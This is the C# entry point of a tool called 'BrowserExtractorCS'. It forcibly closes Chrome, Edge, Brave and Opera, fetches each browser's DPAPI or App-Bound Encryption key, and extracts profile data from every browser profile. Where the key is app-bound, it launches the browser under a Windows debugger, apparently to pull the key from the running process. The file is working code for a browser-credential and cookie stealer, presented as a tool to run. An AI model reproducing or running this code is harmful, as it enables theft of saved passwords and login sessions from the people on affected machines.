using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace BrowserExtractorCS
{
    class Program
    {
        static void Main(string[] args)
        {
            if (args.Length > 0 && args[0] == "--test")
            {
                Tests.Run();
                return;
            }

            var configs = Utils.GetConfigs();

            foreach (var browser in new[] { "chrome.exe", "msedge.exe", "brave.exe", "opera.exe", "launcher.exe" })
            {
                Utils.KillProcessesByName(browser);
            }

            foreach (var config in configs)
            {
                string userDataDir = Utils.GetUserDataDir(config.UserDataSubdir, config.UseRoaming);
                if (userDataDir == null)
                {
                    Console.WriteLine($"User data directory not found for {config.Name}, skipping...");
                    continue;
                }

                string exePath = null;
                foreach (var path in config.ExePaths)
                {
                    if (File.Exists(path))
                    {
                        exePath = path;
                        break;
                    }
                }

                if (exePath == null)
                {
                    Console.WriteLine($"Executable not found for {config.Name}, skipping...");
                    continue;
                }

                Console.WriteLine($"Processing {config.Name}...");

                var v10KeyRes = Utils.GetV10Key(userDataDir);
                bool shouldDebug = config.HasAbe;

                if (v10KeyRes != null)
                {
                    var (key, isDpapi) = v10KeyRes.Value;
                    if (isDpapi && !config.HasAbe)
                    {
                        Console.WriteLine($"Found DPAPI key for {config.Name}, extracting immediately...");
                        Extractor.ExtractAllProfilesData(null, config, userDataDir);
                        shouldDebug = false;
                    }
                    else if (!isDpapi && !config.HasAbe)
                    {
                        Console.WriteLine($"Found ABE key for {config.Name}, extracting immediately...");
                        Extractor.ExtractAllProfilesData(key, config, userDataDir);
                        shouldDebug = false;
                    }
                }

                if (!shouldDebug && !config.HasAbe)
                {
                    continue;
                }

                Win32.STARTUPINFOW si = new Win32.STARTUPINFOW();
                si.cb = (uint)Marshal.SizeOf(typeof(Win32.STARTUPINFOW));
                Win32.PROCESS_INFORMATION pi;

                StringBuilder cmdLine = new StringBuilder($"\"{exePath}\" --no-first-run --no-default-browser-check");

                bool success = Win32.CreateProcessW(
                    null,
                    cmdLine,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    false,
                    Win32.DEBUG_ONLY_THIS_PROCESS | Win32.CREATE_NEW_CONSOLE,
                    IntPtr.Zero,
                    null,
                    ref si,
                    out pi
                );

                if (!success)
                {
                    Console.WriteLine($"Failed to create {config.Name} process: {Win32.GetLastError()}");
                    continue;
                }

                Console.WriteLine($"Started {config.Name} with PID: {pi.dwProcessId}");

                Debugger.DebugLoop(pi.hProcess, config, userDataDir);

                Win32.CloseHandle(pi.hProcess);
                Win32.CloseHandle(pi.hThread);
            }
        }
    }
}
